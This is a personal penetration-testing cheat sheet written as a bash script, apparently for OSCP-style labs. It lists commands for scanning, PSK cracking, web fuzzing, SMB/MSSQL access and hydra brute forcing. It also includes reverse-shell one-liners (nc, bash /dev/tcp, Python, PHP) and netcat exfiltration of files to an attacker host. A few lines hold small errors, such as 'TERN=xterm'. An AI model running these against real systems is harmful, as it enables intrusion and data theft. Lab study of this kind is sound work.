#!/usr/bin/env bash
########################################
# 0. BASIC ENUMERATION
########################################

# Quick network discovery (Ethernet only)
netdiscover -i eth0 -r 10.0.0.1/24 # never gonna need it i guess

# If netdiscover doesn't work (VPN/tunnel), fall back to ping sweep
ifconfig # or ip a
route # sure
nmap 10.0.0.1/24 -sn -T5 -v #for real quick scan of all network

########################################
# Install Rustscan (manual)
########################################
# Download .deb from releases → https://github.com/RustScan/RustScan/releases
# Then install:
dpkg -i rustscan*.deb

########################################
# 1. PORT SCANNING
########################################

# Full TCP scan (OSCP-friendly)
nmap $target -sS -T4 -A -p- -v

# Fast aggressive scan
nmap $target -Pn -p- --min-rate 2000 -sV -v #-sC for default scripts on ALL ports, not a good idea

# UDP quick top ports
nmap $target -Pn -sU -sV -T3 --top-ports 25 -v

# Rustscan (fast)
rustscan -a $target --ulimit 5000

# Scan specific ports
nmap $target -p 22,80 -sC -sV -v

# After scanning → search for known vulns
searchsploit <service/version>

########################################
# 2. VPN / IKE / IPsec Checks
########################################

# Install ike-scan if needed
sudo apt install ike-scan -y

# Identify IKE / IPsec info
sudo ike-scan -M -A $target

# Enumerate and crack PSK
sudo ike-scan -A --pskcrack $target
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

# If credentials found
ssh <user>@$target

# Ensure rockyou is extracted
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

########################################
# 3. WEB ENUMERATION
########################################

# Add virtual hosts manually
sudo vim /etc/hosts

# Basic vulnerability scan
nikto -host $target

# Quick SSTI test (Node/Python templates)
# Try in inputs:
# {{7*7}}

##########
# Dir/VHost Fuzzing
##########
dirsearch -u http://example.lab
gobuster dir -u http://example.lab/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://example.lab/FUZZ
gobuster vhost -u http://example.lab/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

##########
# Manual Web Checks (Burp)
##########
# - Look for JS files, hidden params
# - Check cookies/session tokens
# - Intercept → Modify → Replay requests


##### windows stuff ##########

#for smb, use
smbclient -L $target # to check for anonymous listing of shares, or -U for defining a user, like anonymous even

#then, to connect to the share, do:
smbclient //$target/sharename -U " "%" " #and then, "get" any file you want!

#with any mssql credentials, try impackets mssql
sudo python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@$target -windows-auth

########################################
# 4. CREDENTIAL ATTACKS (LAB ONLY)
########################################

hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
<TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"

########################################
# 5. REVERSE SHELLS & LISTENERS
########################################

# Listener
nc -nvlp 5555

# Common one-liners: - check revshells.com for making the best ones!
# nc (if -e supported)
# nc -e /bin/sh <LHOST> <LPORT>

# Bash
# bash -i >& /dev/tcp/10.10.XX.XXX:5555 0>&1

# Python
# python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# PHP
# php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Spawn stable PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

#also what else?
export TERN=xterm

#and something more i am sure?

########################################
# 6. FILE TRANSFER
########################################

# Receive file on attacker
# nc -nvlp <PORT> > file

# Send from target
# nc <LHOST> <PORT> < file

########################################
# 7. INITIAL POST-EXPLOIT ENUM
########################################

whoami
id
hostname
uname -a
pwd
ls -la
ps aux
sudo -l
